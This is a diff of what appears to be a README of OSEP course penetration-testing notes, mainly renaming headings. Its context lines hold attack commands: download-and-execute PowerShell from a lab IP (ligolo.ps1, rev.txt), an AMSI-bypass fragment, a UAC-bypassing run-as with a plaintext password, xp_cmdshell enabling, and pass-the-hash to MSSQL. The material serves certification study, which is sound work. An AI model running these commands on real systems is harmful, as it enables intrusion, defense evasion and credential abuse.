@@ -1,9 +1,13 @@
 Just a bunch of tools built/gathered along the OSEP course.
 
 1. [Tunneling](#Tunneling)
-2. [MapTheNetwork](#MapTheNetwork)
+2. [Map The Network](#Map-The-Network)
 3. [AMSI-Bypass](#AMSI-Bypass)
-4. [UsefulBasicCommands](#UsefulBasicCommands)
+4. [Useful Basic Commands](#Useful-Basic-Commands)
+5. [Escalate to SYSTEM via Schduele Task](#Escalate-to-SYSTEM-via-Schduele-Task)
+6. [TCP Port Redirection via powercat.ps1](#TCP-Port-Redirection-via-powercat.ps1)
+7. [MSSQL Useful Queries](#MSSQL-Useful-Queries)
+8. [MSSQLPwner](#MSSQLPwner)
 
 
 # Tunneling
@@ -17,7 +21,7 @@ Make sure you are running as x64 bit process before running:
 Invoke it: `iex(iwr http://192.168.45.173:443/ligolo.ps1 -UseBasicParsing)`
 
 
-# MapTheNetwork
+# Map The Network
 - `nxc smb 172.16.125.0/24 --log hosts.txt` (for windows hosts)
 
 - `nxc ssh 172.16.125.0/24 --log hosts.txt` (for linux hosts)
@@ -44,7 +48,7 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c
 
 
 
-# UsefulBasicCommands:
+# Useful Basic Commands
 
 ### <ins>Run command as another user</ins>:
 - `Invoke-RunasCs amit 'Password123!' 'powershell iex(iwr http://192.168.45.185/rev.txt -usebasicparsing)' -ForceProfile -CreateProcessFunction 2 -BypassUac`
@@ -154,7 +158,7 @@ exec ('EXEC sp_configure ''xp_cmdshell'',1 RECONFIGURE') at SQL03
 EXEC('xp_cmdshell ''powershell whoami''') AT SQL03;
 ```
 
-### MSSQLPwner:
+### MSSQLPwner
 Enumerate an MSSQL instance:
 - `mssqlpwner -hashes ':d38a856d6126f47a58ebfa34a4b70fef' 'WEB01$'@db01 -windows-auth interactive`
 
